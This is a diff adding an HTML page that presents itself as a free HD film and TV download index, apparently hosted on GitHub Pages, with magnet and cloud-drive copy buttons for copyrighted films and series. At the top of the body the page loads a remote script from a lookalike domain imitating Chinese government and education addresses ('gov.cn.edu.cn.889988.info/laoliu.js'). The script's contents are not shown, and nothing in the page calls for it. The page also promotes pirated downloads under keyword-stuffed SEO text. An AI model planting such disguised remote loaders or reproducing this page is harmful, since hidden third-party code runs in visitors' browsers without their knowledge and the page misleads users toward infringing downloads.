@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视大全免费高清版下载 - 4K/1080P资源索引 | yingshidaquanmianfeigaoqingbanxiazai-h5.github.io</title>
+<meta name="description" content="影视大全免费高清版下载（yingshidaquanmianfeigaoqingbanxiazai-h5.github.io）提供电影、电视剧、动漫、综艺的4K/1080P高清资源索引与下载导航，每日免费更新，手机电脑自适应访问。">
+<meta name="keywords" content="影视大全, 免费高清下载, 4K电影下载, 1080P影视, 影视资源索引, yingshidaquanmianfeigaoqingbanxiazai-h5">
+<meta name="author" content="影视大全免费高清版下载">
+<meta name="robots" content="index, follow">
+<style>
+  :root{
+    --paper:#fdf6e3;
+    --ink:#111111;
+    --yellow:#ffe14d;
+    --pink:#ff5d8f;
+    --blue:#43c6db;
+    --green:#7bd389;
+    --line:3px solid var(--ink);
+    --shadow:6px 6px 0 var(--ink);
+    --shadow-sm:4px 4px 0 var(--ink);
+    --sans:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+    --mono:'SFMono-Regular',Consolas,monospace;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{
+    font-family:var(--sans);background:var(--paper);color:var(--ink);
+    line-height:1.6;padding:1rem;
+    background-image:radial-gradient(#1111 1px,transparent 1px);
+    background-size:16px 16px;
+  }
+  a{color:var(--ink);text-decoration:none;}
+  .wrap{max-width:1080px;margin:0 auto;}
+
+  /* 顶栏 */
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    border:var(--line);background:var(--yellow);
+    box-shadow:var(--shadow);border-radius:0;padding:.8rem 1.1rem;margin-bottom:2rem;
+  }
+  .brand{font-weight:900;font-size:1.25rem;letter-spacing:-.5px;}
+  .brand b{background:var(--pink);padding:0 .3rem;box-decoration-break:clone;}
+  .nav{display:flex;gap:.8rem;font-family:var(--mono);font-size:.8rem;font-weight:700;}
+  .nav a{border:2px solid var(--ink);padding:.2rem .5rem;background:#fff;}
+  .nav a:hover{background:var(--blue);transform:translate(-2px,-2px);box-shadow:var(--shadow-sm);}
+
+  /* 通用栏目 */
+  section{margin:3.5rem 0;}
+  .sec-head{
+    display:inline-block;background:var(--ink);color:var(--paper);
+    font-family:var(--mono);font-size:.85rem;font-weight:700;
+    padding:.3rem .8rem;margin-bottom:1.5rem;letter-spacing:1px;
+  }
+
+  /* 栏目1：公告牌Hero */
+  #home .billboard{
+    border:var(--line);background:#fff;box-shadow:var(--shadow);
+    padding:2.2rem;position:relative;
+  }
+  #home .tape{
+    position:absolute;top:-14px;left:24px;background:var(--pink);
+    border:2px solid var(--ink);padding:.1rem .7rem;font-family:var(--mono);
+    font-size:.7rem;font-weight:700;transform:rotate(-3deg);
+  }
+  #home h1{
+    font-size:clamp(2.2rem,6vw,4rem);line-height:.95;letter-spacing:-1.5px;
+    margin:.5rem 0 1rem;-webkit-text-stroke:1px var(--ink);
+  }
+  #home h1 em{font-style:normal;background:var(--yellow);padding:0 .2rem;}
+  #home p.lead{max-width:600px;font-size:1rem;margin-bottom:1.5rem;}
+  .tags{display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:1.5rem;}
+  .tag{
+    font-family:var(--mono);font-weight:700;font-size:.75rem;
+    border:2px solid var(--ink);padding:.25rem .6rem;background:var(--blue);
+  }
+  .tag.t2{background:var(--green);}
+  .tag.t3{background:var(--pink);}
+  .cta{
+    display:inline-block;background:var(--ink);color:var(--paper);
+    font-weight:800;padding:.7rem 1.6rem;border:2px solid var(--ink);
+    box-shadow:var(--shadow-sm);transition:.15s;
+  }
+  .cta:hover{transform:translate(-3px,-3px);box-shadow:8px 8px 0 var(--pink);}
+
+  /* 栏目2：贴纸分类 */
+  #category .grid{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1.2rem;
+  }
+  .sticker{
+    border:var(--line);background:#fff;box-shadow:var(--shadow-sm);
+    padding:1.1rem;position:relative;transition:.15s;
+  }
+  .sticker:hover{transform:translate(-4px,-4px);box-shadow:8px 8px 0 var(--ink);}
+  .sticker .no{
+    position:absolute;top:-12px;right:-10px;width:30px;height:30px;
+    background:var(--yellow);border:2px solid var(--ink);
+    display:flex;align-items:center;justify-content:center;
+    font-family:var(--mono);font-weight:900;font-size:.8rem;transform:rotate(6deg);
+  }
+  .sticker h3{font-size:1.05rem;margin-bottom:.3rem;}
+  .sticker p{font-size:.8rem;color:#444;}
+  .sticker.c2{background:var(--blue);}
+  .sticker.c3{background:var(--green);}
+  .sticker.c4{background:var(--pink);}
+
+  /* 栏目3：便签资源库 */
+  #latest .notes{display:flex;flex-direction:column;gap:1rem;}
+  .note-row{
+    display:grid;grid-template-columns:auto 1fr auto;gap:1rem;align-items:center;
+    border:var(--line);background:#fff;box-shadow:var(--shadow-sm);padding:.9rem 1rem;
+  }
+  .stamp{
+    font-family:var(--mono);font-weight:900;font-size:.7rem;color:#fff;
+    background:var(--ink);padding:.2rem .4rem;border:2px solid var(--ink);
+  }
+  .stamp.k4{background:var(--pink);}
+  .stamp.h1080{background:var(--blue);}
+  .stamp.bd{background:var(--green);color:var(--ink);}
+  .note-row h3{font-size:1rem;}
+  .note-row .meta{font-family:var(--mono);font-size:.72rem;color:#555;margin-top:.2rem;}
+  .copy{
+    font-family:var(--mono);font-weight:700;font-size:.78rem;cursor:pointer;
+    border:2px solid var(--ink);background:var(--yellow);padding:.35rem .7rem;
+    box-shadow:3px 3px 0 var(--ink);transition:.12s;white-space:nowrap;
+  }
+  .copy:hover{transform:translate(-2px,-2px);box-shadow:5px 5px 0 var(--ink);}
+  .copy:active{transform:translate(1px,1px);box-shadow:1px 1px 0 var(--ink);}
+
+  /* 栏目4：撕纸热榜 */
+  #ranking .list{max-width:720px;}
+  .rk{
+    display:grid;grid-template-columns:48px 1fr auto;gap:1rem;align-items:center;
+    border:var(--line);background:#fff;box-shadow:var(--shadow-sm);
+    padding:.8rem 1rem;margin-bottom:.9rem;
+  }
+  .rk-no{
+    font-family:var(--mono);font-weight:900;font-size:1.3rem;
+    background:var(--yellow);border:2px solid var(--ink);text-align:center;transform:rotate(-4deg);
+  }
+  .rk-no.top{background:var(--pink);}
+  .rk h3{font-size:1rem;}
+  .rk .sub{font-size:.75rem;color:#555;}
+  .rk-track{height:10px;background:#fff;border:2px solid var(--ink);margin-top:.4rem;position:relative;}
+  .rk-fill{height:100%;background:var(--blue);border-right:2px solid var(--ink);}
+  .rk-val{font-family:var(--mono);font-weight:800;font-size:.85rem;}
+
+  /* 栏目5：说明 */
+  #about .box{
+    border:var(--line);background:var(--green);box-shadow:var(--shadow);
+    padding:1.5rem;font-size:.9rem;
+  }
+  #about .box b{background:var(--paper);padding:0 .2rem;}
+  .url{
+    display:inline-block;margin-top:1rem;font-family:var(--mono);font-weight:700;
+    border:2px solid var(--ink);background:var(--yellow);padding:.4rem .8rem;
+  }
+
+  footer{
+    text-align:center;font-family:var(--mono);font-size:.8rem;font-weight:700;
+    padding:2.5rem 0 1rem;border-top:var(--line);margin-top:2rem;
+  }
+
+  @media(max-width:768px){
+    .nav{display:none;}
+    #home .billboard{padding:1.5rem;}
+    .note-row{grid-template-columns:auto 1fr;}
+    .copy{grid-column:1/-1;width:100%;}
+    #category .grid{grid-template-columns:1fr 1fr;}
+    .rk{grid-template-columns:40px 1fr;}
+    .rk-val{display:none;}
+  }
+  @media(max-width:420px){
+    #category .grid{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="wrap">
+
+  <header class="topbar">
+    <div class="brand">影视大全<b>免费高清</b></div>
+    <nav class="nav">
+      <a href="#home">首页</a>
+      <a href="#category">分类</a>
+      <a href="#latest">资源库</a>
+      <a href="#ranking">热榜</a>
+      <a href="#about">说明</a>
+    </nav>
+  </header>
+
+  <main>
+    <!-- 栏目1 -->
+    <section id="home">
+      <div class="billboard">
+        <span class="tape">FREE · 4K · 每日上新</span>
+        <h1>影视大全<br><em>免费高清版下载</em></h1>
+        <p class="lead">yingshidaquanmianfeigaoqingbanxiazai-h5.github.io —— 电影、剧集、动漫、综艺一站式高清资源索引。不绕路、不弹窗，点开就找到想下的那一部。</p>
+        <div class="tags">
+          <span class="tag">4K 原盘</span>
+          <span class="tag t2">1080P WEB</span>
+          <span class="tag t3">蓝光 REMUX</span>
+          <span class="tag t2">中字配音</span>
+          <span class="tag">磁力/网盘</span>
+        </div>
+        <a href="#latest" class="cta">翻资源库 →</a>
+      </div>
+    </section>
+
+    <!-- 栏目2 -->
+    <section id="category">
+      <div class="sec-head">// 资源分类区</div>
+      <div class="grid">
+        <div class="sticker"><span class="no">01</span><h3>电影大厅</h3><p>院线新片 / 经典修复 / 外语片</p></div>
+        <div class="sticker c2"><span class="no">02</span><h3>剧集仓库</h3><p>国产 / 美剧 / 韩剧 / 日剧</p></div>
+        <div class="sticker c3"><span class="no">03</span><h3>动漫街区</h3><p>连载番 / 剧场版 / OVA</p></div>
+        <div class="sticker c4"><span class="no">04</span><h3>综艺盒子</h3><p>真人秀 / 脱口秀 / 选秀</p></div>
+        <div class="sticker c2"><span class="no">05</span><h3>纪录片架</h3><p>自然 / 历史 / 科技</p></div>
+        <div class="sticker"><span class="no">06</span><h3>短片与合集</h3><p>花絮 / 导演剪辑 / 系列合集</p></div>
+      </div>
+    </section>
+
+    <!-- 栏目3 -->
+    <section id="latest">
+      <div class="sec-head">// 高清资源库（最新）</div>
+      <div class="notes">
+        <div class="note-row">
+          <span class="stamp k4">4K</span>
+          <div><h3>沙丘3：救世主</h3><div class="meta">科幻 / 78.4GB / 蓝光原盘 / 中字</div></div>
+          <button class="copy" data-link="#">复制磁力</button>
+        </div>
+        <div class="note-row">
+          <span class="stamp h1080">1080P</span>
+          <div><h3>庆余年2（全32集）</h3><div class="meta">古装权谋 / WEB-DL / 夸克网盘</div></div>
+          <button class="copy" data-link="#">复制网盘</button>
+        </div>
+        <div class="note-row">
+          <span class="stamp bd">BD</span>
+          <div><h3>周处除三害</h3><div class="meta">动作犯罪 / REMUX / 杜比音轨</div></div>
+          <button class="copy" data-link="#">复制磁力</button>
+        </div>
+        <div class="note-row">
+          <span class="stamp h1080">1080P</span>
+          <div><h3>飞驰人生2</h3><div class="meta">喜剧 / 5.2GB / 迅雷通道</div></div>
+          <button class="copy" data-link="#">复制迅雷</button>
+        </div>
+        <div class="note-row">
+          <span class="stamp k4">4K</span>
+          <div><h3>咒术回战 第三季</h3><div class="meta">动漫 / HDR / 日语FLAC / 磁力</div></div>
+          <button class="copy" data-link="#">复制磁力</button>
+        </div>
+        <div class="note-row">
+          <span class="stamp h1080">1080P</span>
+          <div><h3>繁花（全剧合集）</h3><div class="meta">国产剧 / 王家卫 / 网盘分流</div></div>
+          <button class="copy" data-link="#">复制网盘</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目4 -->
+    <section id="ranking">
+      <div class="sec-head">// 下载热榜</div>
+      <div class="list">
+        <div class="rk">
+          <div class="rk-no top">1</div>
+          <div><h3>沙丘3 4K原盘</h3><div class="sub">科幻 / 高码率</div>
+            <div class="rk-track"><div class="rk-fill" style="width:98%"></div></div></div>
+          <div class="rk-val">98%</div>
+        </div>
+        <div class="rk">
+          <div class="rk-no top">2</div>
+          <div><h3>庆余年2 合集</h3><div class="sub">古装 / 热播</div>
+            <div class="rk-track"><div class="rk-fill" style="width:95%"></div></div></div>
+          <div class="rk-val">95%</div>
+        </div>
+        <div class="rk">
+          <div class="rk-no top">3</div>
+          <div><h3>繁花 1080P</h3><div class="sub">国产剧 / 修复</div>
+            <div class="rk-track"><div class="rk-fill" style="width:92%"></div></div></div>
+          <div class="rk-val">92%</div>
+        </div>
+        <div class="rk">
+          <div class="rk-no">4</div>
+          <div><h3>周处除三害 REMUX</h3><div class="sub">动作 / 犯罪</div>
+            <div class="rk-track"><div class="rk-fill" style="width:88%"></div></div></div>
+          <div class="rk-val">88%</div>
+        </div>
+        <div class="rk">
+          <div class="rk-no">5</div>
+          <div><h3>热辣滚烫 1080P</h3><div class="sub">喜剧 / 励志</div>
+            <div class="rk-track"><div class="rk-fill" style="width:84%"></div></div></div>
+          <div class="rk-val">84%</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目5 -->
+    <section id="about">
+      <div class="sec-head">// 站点说明</div>
+      <div class="box">
+        <p><b>影视大全免费高清版下载</b>是一个影视资源索引导航单页，仅整理公开渠道的磁力、网盘链接与分类信息，<b>不托管任何影视文件本体</b>，也不内置播放源。</p>
+        <p style="margin-top:.6rem">资源版权归原制作方、发行方所有；若涉及侵权，请联系对应权利人或平台处理，本站收到通知会及时移除相关索引。用户下载行为须遵守当地法律法规，仅限个人学习交流，下载后请及时删除。</p>
+        <a href="#" class="url">🌐 yingshidaquanmianfeigaoqingbanxiazai-h5.github.io</a>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    影视大全免费高清版下载 / yingshidaquanmianfeigaoqingbanxiazai-h5.github.io<br>
+    © 2026 单页索引演示 · Neo-Brutalism Edition
+  </footer>
+</div>
+
+<script>
+  // 平滑滚动
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const t=document.querySelector(a.getAttribute('href'));
+      if(t)t.scrollIntoView({behavior:'smooth'});
+    });
+  });
+  // 复制按钮
+  document.querySelectorAll('.copy').forEach(btn=>{
+    btn.addEventListener('click',()=>{
+      const link=btn.dataset.link||'#';
+      if(navigator.clipboard)navigator.clipboard.writeText(link).catch(()=>{});
+      const old=btn.textContent;
+      btn.textContent='已复制✓';
+      setTimeout(()=>btn.textContent=old,1200);
+    });
+  });
+</script>
+</body>
+</html>
